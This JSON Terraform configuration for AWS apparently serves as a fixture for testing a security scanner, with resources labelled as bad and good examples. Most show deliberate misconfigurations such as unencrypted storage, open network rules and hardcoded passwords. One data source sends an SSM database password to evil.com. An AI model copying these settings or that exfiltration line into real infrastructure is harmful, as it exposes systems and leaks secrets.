{
    "provider": [
        {
            "aws": {
                "region": "us-west-2"
            }
        }
    ],
    "data": [
        {
            "http": {
                "not_exfiltrating_data_honest": {
                    "url": "https://evil.com/?p=${aws_ssm_parameter.db_password.value}"
                }
            }
        }
    ],
    "resource": [
        {
            "aws_api_gateway_domain_name": {
                "resource_name": "as",
                "resource_configuration": {
                    "security_policy": "TLS_1_0"
                }
            }
        },
        {
            "aws_launch_configuration": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "associate_public_ip_address": true,
                    "root_block_device": [
                        {
                            "encrypted": false
                        }
                    ]
                }
            }
        },
        {
            "aws_docdb_cluster": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "cluster_identifier": "my-docdb-cluster",
                    "engine": "docdb",
                    "master_username": "foo",
                    "master_password": "mustbeeightchars",
                    "backup_retention_period": 5,
                    "preferred_backup_window": "07:00-09:00",
                    "skip_final_snapshot": true,
                    "storage_encrypted": false
                }
            }
        },
        {
            "aws_instance": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "ami": "ami-7f89a64f",
                    "instance_type": "t1.micro",
                    "root_block_device": [
                        {
                            "encrypted": false
                        }
                    ],
                    "ebs_block_device": [
                        {
                            "device_name": "/dev/sdg",
                            "volume_size": 5,
                            "volume_type": "gp2",
                            "delete_on_termination": false,
                            "encrypted": false
                        }
                    ]
                }
            }
        },
        {
            "aws_network_acl_rule": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "egress": false,
                    "protocol": "all",
                    "rule_action": "allow",
                    "cidr_block": "0.0.0.0/0"
                }
            }
        },
        {
            "aws_security_group": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "egress": [
                        {
                            "cidr_blocks": [
                                "0.0.0.0/0"
                            ]
                        }
                    ]
                }
            }
        },
        {
            "aws_default_vpc": {
                "resource_name": "default",
                "resource_configuration": {
                    "tags": {
                        "Name": "Default VPC"
                    }
                }
            }
        },
        {
            "aws_cloudfront_distribution": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "default_cache_behavior": [
                        {
                            "viewer_protocol_policy": "allow-all"
                        }
                    ]
                }
            }
        },
        {
            "aws_ebs_volume": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "availability_zone": "us-west-2a",
                    "size": 40,
                    "tags": {
                        "Name": "HelloWorld"
                    },
                    "encrypted": false
                }
            }
        },
        {
            "aws_subnet": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "vpc_id": "vpc-123456",
                    "map_public_ip_on_launch": true
                }
            }
        },
        {
            "aws_ecr_repository": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "name": "bar",
                    "image_tag_mutability": "MUTABLE",
                    "image_scanning_configuration": [
                        {
                            "scan_on_push": false
                        }
                    ]
                }
            }
        },
        {
            "aws_efs_file_system": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "name": "bar",
                    "encrypted": false,
                    "kms_key_id": ""
                }
            }
        },
        {
            "aws_elasticsearch_domain": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "domain_name": "domain-foo",
                    "encrypt_at_rest": [
                        {
                            "enabled": false
                        }
                    ]
                }
            }
        },
        {
            "aws_elasticsearch_domain": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "domain_name": "domain-foo",
                    "node_to_node_encryption": [
                        {
                            "enabled": false
                        }
                    ]
                }
            }
        },
        {
            "aws_elasticsearch_domain": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "domain_name": "domain-foo",
                    "domain_endpoint_options": [
                        {
                            "enforce_https": false
                        }
                    ]
                }
            }
        },
        {
            "aws_eks_cluster": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "name": "bad_example_cluster",
                    "role_arn": "${var.cluster_arn}",
                    "vpc_config": [
                        {
                            "endpoint_public_access": true,
                            "public_access_cidrs": [
                                "0.0.0.0/0"
                            ]
                        }
                    ]
                }
            }
        },
        {
            "aws_docdb_cluster": {
                "resource_name": "good_example",
                "resource_configuration": {
                    "cluster_identifier": "my-docdb-cluster",
                    "engine": "docdb",
                    "master_username": "foo",
                    "master_password": "mustbeeightchars",
                    "backup_retention_period": 5,
                    "preferred_backup_window": "07:00-09:00",
                    "skip_final_snapshot": true,
                    "enabled_cloudwatch_logs_exports": "audit"
                }
            }
        },
        {
            "aws_cloudfront_distribution": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "viewer_certificate": [
                        {
                            "cloudfront_default_certificate": "${aws_acm_certificate.example.arn}",
                            "minimum_protocol_version": "TLSv1.0"
                        }
                    ]
                }
            }
        },
        {
            "aws_security_group": {
                "resource_name": "example",
                "resource_configuration": {
                    "name": "terraform-example-instance",
                    "description": "Allow SSH inbound traffic",
                    "ingress": [
                        {
                            "from_port": 22,
                            "to_port": 22,
                            "protocol": "tcp",
                            "cidr_blocks": [
                                "0.0.0.0/0"
                            ]
                        }
                    ],
                    "egress": [
                        {
                            "from_port": 0,
                            "to_port": 0,
                            "protocol": "-1",
                            "cidr_blocks": [
                                "0.0.0.0/0"
                            ]
                        }
                    ]
                }
            }
        },
        {
            "aws_instance": {
                "resource_name": "example",
                "resource_configuration": {
                    "ami": "ami-0c55b159cbfafe1f0",
                    "instance_type": "t2.micro",
                    "security_groups": [
                        "${aws_security_group.example.name}"
                    ],
                    "tags": {
                        "Name": "ExampleInstance"
                    }
                }
            }
        },
        {
            "aws_elasticsearch_domain": {
                "resource_name": "good_example",
                "resource_configuration": {
                    "domain_name": "domain-foo",
                    "domain_endpoint_options": [
                        {
                            "enforce_https": true,
                            "tls_security_policy": "Policy-Min-TLS-1-0-2019-07"
                        }
                    ]
                }
            }
        },
        {
            "aws_elasticache_replication_group": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "replication_group_id": "foo",
                    "replication_group_description": "my foo cluster",
                    "at_rest_encryption_enabled": false
                }
            }
        },
        {
            "aws_alb": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "internal": false
                }
            }
        },
        {
            "aws_elasticache_replication_group": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "replication_group_id": "foo",
                    "replication_group_description": "my foo cluster",
                    "transit_encryption_enabled": false
                }
            }
        },
        {
            "aws_alb": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "name": "bad_alb",
                    "internal": false,
                    "load_balancer_type": "application",
                    "access_logs": [
                        {
                            "bucket": "${aws_s3_bucket.lb_logs.bucket}",
                            "prefix": "test-lb",
                            "enabled": true
                        }
                    ],
                    "drop_invalid_header_fields": false
                }
            }
        },
        {
            "aws_alb_listener": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "protocol": "HTTP"
                }
            }
        },
        {
            "aws_iam_access_key": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "user": "root"
                }
            }
        },
        {
            "aws_kms_key": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "enable_key_rotation": false
                }
            }
        },
        {
            "aws_mq_broker": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "broker_name": "example",
                    "configuration": [
                        {
                            "id": "${aws_mq_configuration.test.id}",
                            "revision": "${aws_mq_configuration.test.latest_revision}"
                        }
                    ],
                    "engine_type": "ActiveMQ",
                    "engine_version": "5.15.0",
                    "host_instance_type": "mq.t2.micro",
                    "security_groups": [
                        "${aws_security_group.test.id}"
                    ],
                    "user": [
                        {
                            "username": "ExampleUser",
                            "password": "MindTheGap"
                        }
                    ],
                    "logs": [
                        {
                            "audit": false
                        }
                    ],
                    "publicly_accessible": true
                }
            }
        },
        {
            "aws_msk_cluster": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "encryption_info": [
                        {
                            "encryption_in_transit": [
                                {
                                    "client_broker": "TLS_PLAINTEXT",
                                    "in_cluster": true
                                }
                            ]
                        }
                    ]
                }
            }
        },
        {
            "aws_neptune_cluster": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "cluster_identifier": "neptune-cluster-demo",
                    "engine": "neptune",
                    "backup_retention_period": 5,
                    "preferred_backup_window": "07:00-09:00",
                    "skip_final_snapshot": true,
                    "iam_database_authentication_enabled": true,
                    "apply_immediately": true,
                    "storage_encrypted": false
                }
            }
        },
        {
            "aws_rds_cluster_instance": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "name": "bar",
                    "performance_insights_enabled": false,
                    "performance_insights_kms_key_id": ""
                }
            }
        },
        {
            "aws_db_security_group": {
                "resource_name": "bad_example",
                "resource_configuration": {}
            }
        },
        {
            "aws_s3_bucket_public_access_block": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "bucket": "${aws_s3_bucket.example.id}",
                    "ignore_public_acls": false
                }
            }
        },
        {
            "aws_s3_bucket": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "acl": "public-read"
                }
            }
        },
        {
            "aws_ecs_cluster": {
                "resource_name": "good_example",
                "resource_configuration": {
                    "name": "services-cluster",
                    "setting": [
                        {
                            "name": "containerInsights",
                            "value": "enabled"
                        }
                    ]
                }
            }
        },
        {
            "aws_athena_database": {
                "resource_name": "good_example",
                "resource_configuration": {
                    "name": "database_name",
                    "bucket": "${aws_s3_bucket.hoge.bucket}",
                    "encryption_configuration": [
                        {
                            "encryption_option": "SSE_KMS",
                            "kms_key_arn": "${aws_kms_key.example.arn}"
                        }
                    ]
                }
            }
        },
        {
            "aws_athena_workgroup": {
                "resource_name": "good_example",
                "resource_configuration": {
                    "name": "example",
                    "configuration": [
                        {
                            "enforce_workgroup_configuration": true,
                            "publish_cloudwatch_metrics_enabled": true,
                            "result_configuration": [
                                {
                                    "output_location": "s3://${aws_s3_bucket.example.bucket}/output/",
                                    "encryption_configuration": [
                                        {
                                            "encryption_option": "SSE_KMS",
                                            "kms_key_arn": "${aws_kms_key.example.arn}"
                                        }
                                    ]
                                }
                            ]
                        }
                    ]
                }
            }
        },
        {
            "aws_launch_template": {
                "resource_name": "good_example",
                "resource_configuration": {
                    "image_id": "ami-005e54dee72cc1d00",
                    "instance_type": "t2.micro",
                    "metadata_options": [
                        {
                            "http_tokens": "required"
                        }
                    ]
                }
            }
        },
        {
            "aws_cloudfront_distribution": {
                "resource_name": "bad_example",
                "resource_configuration": {}
            }
        },
        {
            "aws_cloudtrail": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "event_selector": [
                        {
                            "read_write_type": "All",
                            "include_management_events": true,
                            "data_resource": [
                                {
                                    "type": "AWS::S3::Object",
                                    "values": [
                                        "${data.aws_s3_bucket.important-bucket.arn}/"
                                    ]
                                }
                            ]
                        }
                    ]
                }
            }
        },
        {
            "aws_cloudtrail": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "is_multi_region_trail": true,
                    "event_selector": [
                        {
                            "read_write_type": "All",
                            "include_management_events": true,
                            "data_resource": [
                                {
                                    "type": "AWS::S3::Object",
                                    "values": [
                                        "${data.aws_s3_bucket.important-bucket.arn}/"
                                    ]
                                }
                            ]
                        }
                    ]
                }
            }
        },
        {
            "aws_s3_bucket": {
                "resource_name": "good_example",
                "resource_configuration": {
                    "bucket": "abcdefgh"
                }
            }
        },
        {
            "aws_cloudwatch_log_group": {
                "resource_name": "good_example",
                "resource_configuration": {
                    "name": "good_example",
                    "kms_key_id": "${aws_kms_key.log_key.arn}"
                }
            }
        },
        {
            "aws_codebuild_project": {
                "resource_name": "bad_example",
                "resource_configuration": {
                    "artifacts": [
                        {
                            "encryption_disabled": true
                        }
                    ]
                }
            }
        }
    ]
}